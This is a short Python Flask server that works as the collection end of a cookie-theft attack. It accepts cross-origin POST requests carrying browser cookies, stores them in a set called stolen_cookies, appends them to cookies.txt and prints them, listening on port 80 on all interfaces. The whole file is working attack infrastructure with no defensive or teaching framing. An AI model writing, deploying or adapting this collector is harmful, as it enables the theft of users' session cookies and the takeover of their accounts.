from flask import Flask, request
from flask.ext.cors import CORS

import json

app = Flask(__name__)
app.debug = True

CORS(app)

stolen_cookies = set([])

@app.route('/', methods = [ 'POST' ])
def index():

    data = json.loads(request.data)

    cookies = data.get('cookies', None)

    if cookies is not None and cookies not in stolen_cookies:
        stolen_cookies.add( cookies )

        with open('cookies.txt', 'a') as fd:
            fd.write(cookies)
    
        print cookies

    return json.dumps({
        'Success' : True,
    })

app.run(host='0.0.0.0', port=80)
